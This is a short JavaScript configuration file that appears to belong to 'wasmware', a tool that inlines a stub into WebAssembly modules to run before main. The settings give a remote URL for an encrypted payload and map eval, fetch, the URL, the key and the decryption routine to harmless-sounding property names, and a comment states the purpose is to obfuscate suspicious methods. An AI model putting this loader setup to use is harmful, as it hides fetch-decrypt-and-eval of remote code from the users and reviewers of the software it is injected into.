// General data regarding module and wasmware import names
export const module_name = "env";
export const wasmware_import_name = "wasmware";
export const global_setter_import_name = "global_setter";
export const wasmware_import_func_name = "$env.wasmware";
export const global_setter_import_func_name = "$env.global_setter";

// JS output info, such as variable reference names and tab formatting
export const js_u8_reference = "u8";
export const js_decoder_reference = "l";
export const tab_size = 2;

// PAYLOAD REQUEST URL.
export const url = "https://raw.githubusercontent.com/Lucrehulk/wasmware/refs/heads/main/src/txts/output/encrypted_payload.txt";

// WebAssembly options. Options to fold lines (wrap in ()) and set the target memory address where the stub will be inlined.
export const fold_lines = false;
export const target_address = 0;

// Info regarding naming and parameter specification for the wasmware func
export const wasmware_func_name = "wasmware";
export const wasmware_func_export_name = "wasmware";
export const local_counter_1_name = "$var0";
export const local_counter_2_name = "$var1";

// The Wasmware func will be executed just before main.
export const insert_wasmware_func_before = `export "main"`;

// Property alias that Wasmware will set suspicious methods and strings to, hence obfuscating suspicious things.
export const global_eval_setter_property = "ModuleInstantiate";
export const global_fetch_setter_property = "WebAssemblyKeys";
export const global_url_alias_setter_property = "WebAssemblyImports";
export const global_key_alias_setter_property = "WebAssemblyExports";
export const global_decryption_alias_setter_property = "ModuleHandler";
